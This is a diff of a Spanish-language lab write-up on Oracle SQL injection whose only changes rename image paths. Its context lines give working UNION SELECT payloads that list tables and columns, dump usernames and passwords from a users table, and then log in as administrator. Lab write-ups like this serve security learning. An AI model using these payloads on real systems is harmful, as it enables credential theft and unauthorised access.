@@ -16,12 +16,12 @@ Una vez localizada la contraseña del administrador, basta con iniciar sesión p
 Solucion
 
 En caso de que no funcione order by y sea oracle tenemos que utilizar el dual
-![Pasted image 20250702163506.png](imagenes/Pasted image 20250702163506.png)
+![Pasted_image_20250702163506.png](Imagenes/Pasted_image_20250702163506.png)
 entonces para mostar la informacion de las tablas quitando el pet ' union select NULL,table_name from all_tables-- -
-![Pasted image 20250702163908.png](imagenes/Pasted image 20250702163908.png)
+![Pasted_image_20250702163908.png](Imagenes/Pasted_image_20250702163908.png)
 vamos a extraer la infomacion de las columnas ' union select NULL,column_name from all_tab_columns where table_name='USERS_KILSBN'-- -
-![Pasted image 20250702164445.png](imagenes/Pasted image 20250702164445.png)
+![Pasted_image_20250702164445.png](Imagenes/Pasted_image_20250702164445.png)
 ahora extraemos la informacion de los usuarios y contraseñas ' union select PASSWORD_HUFHYI,USERNAME_JGKXRW from USERS_KILSBN-- -
-![Pasted image 20250702164533.png](imagenes/Pasted image 20250702164533.png)
+![Pasted_image_20250702164533.png](Imagenes/Pasted_image_20250702164533.png)
 nos logeamos 
-![Pasted image 20250702164619.png](imagenes/Pasted image 20250702164619.png)
+![Pasted_image_20250702164619.png](Imagenes/Pasted_image_20250702164619.png)
